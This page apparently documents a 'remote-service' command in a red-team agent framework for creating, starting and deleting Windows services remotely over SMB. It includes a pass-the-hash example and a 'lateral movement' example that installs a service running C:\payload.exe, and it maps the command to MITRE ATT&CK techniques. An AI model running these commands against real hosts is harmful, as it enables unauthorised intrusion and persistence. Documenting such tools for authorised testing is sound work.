+++
title = "remote-service"
chapter = false
weight = 202
hidden = false
+++

## Summary

List, query, create, start, stop, and delete services on remote Windows hosts via SVCCTL RPC over SMB named pipes. Supports password and pass-the-hash authentication. This command runs cross-platform — the agent connects to the remote Windows host's `\PIPE\svcctl` named pipe over SMB port 445.

{{% notice info %}}Targets Windows hosts, but can be executed from Windows, Linux, or macOS agents.{{% /notice %}}

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | Yes | list | Operation: `list`, `query`, `create`, `start`, `stop`, `delete` |
| server | Yes | | Remote Windows host IP or hostname |
| name | No | | Service name (required for query/create/start/stop/delete) |
| display_name | No | | Display name (for create; defaults to service name) |
| binpath | No | | Service binary path (required for create) |
| start_type | No | demand | Start type: `auto`, `demand`, `disabled` |
| username | Yes | | Account for authentication |
| password | No | | Password (or use hash for pass-the-hash) |
| hash | No | | NTLM hash in LM:NT or NT-only format |
| domain | No | | Domain name |
| timeout | No | 30 | Connection timeout in seconds |

## Usage

### List all services
```
remote-service -action list -server 192.168.1.1 -username Administrator -password P@ssw0rd -domain CORP.LOCAL
```

### Query a specific service
```
remote-service -action query -server dc01 -name Spooler -username admin -hash aad3b435b51404ee:8846f7eaee8fb117 -domain CORP.LOCAL
```

### Create a service (lateral movement)
```
remote-service -action create -server 192.168.1.1 -name UpdateSvc -binpath C:\payload.exe -start_type demand -username admin -password pass -domain CORP
```

### Start a service
```
remote-service -action start -server 192.168.1.1 -name UpdateSvc -username admin -password pass
```

### Stop a service
```
remote-service -action stop -server dc01 -name UpdateSvc -username admin -password pass
```

### Delete a service (cleanup)
```
remote-service -action delete -server dc01 -name UpdateSvc -username admin -password pass
```

## MITRE ATT&CK Mapping

- **T1569.002** - System Services: Service Execution
- **T1543.003** - Create or Modify System Process: Windows Service
- **T1007** - System Service Discovery
